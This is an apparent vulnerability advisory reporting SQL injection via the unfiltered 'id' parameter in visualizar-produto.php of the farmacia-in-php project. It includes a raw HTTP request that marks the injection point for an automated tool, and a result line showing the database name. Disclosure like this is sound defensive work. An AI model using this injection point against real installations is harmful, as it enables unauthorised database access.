# farmacia-in-php has sql injection in visualizar-produto.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
visualizar-produto.php

## describe

**Code analysis**    

In the visualizar-produto.php file of farmacia-in-php, the id parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-20241127113636173](https://github.com/user-attachments/assets/9180f0be-6614-4710-865e-8f3c6084bfb8)



## POC

```
GET /visualizar-produto.php?id=1* HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=ecmd5kmr6te8fpgjnri7c4up85
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

save as  1.txt

**Result**

![image-20241127113606237](https://github.com/user-attachments/assets/01502af9-7e2c-4cdb-976f-d7c5f4996e2c)

Get databases: farmacia

![image-20241127110033174](https://github.com/user-attachments/assets/1b14199f-d617-42f1-9d33-41facaa28c97)